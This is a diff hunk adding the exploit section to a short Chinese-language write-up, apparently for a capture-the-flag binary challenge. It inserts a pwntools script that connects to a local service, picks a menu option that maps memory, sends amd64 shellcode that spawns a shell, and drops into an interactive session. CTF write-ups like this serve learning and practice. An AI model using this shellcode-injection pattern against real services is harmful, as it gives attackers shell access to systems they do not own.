@@ -16,7 +16,12 @@ ghidra分析为64位程序
 ## EXPLOIT
 
 ```python
-
+from pwn import *
+sh = remote('localhost', 33251)
+sh.sendline(b'4') # mmap paper 0
+shc = asm(shellcraft.amd64.sh(), arch='amd64')
+sh.sendline(shc)
+sh.interactive()
 ```
 
 Done.
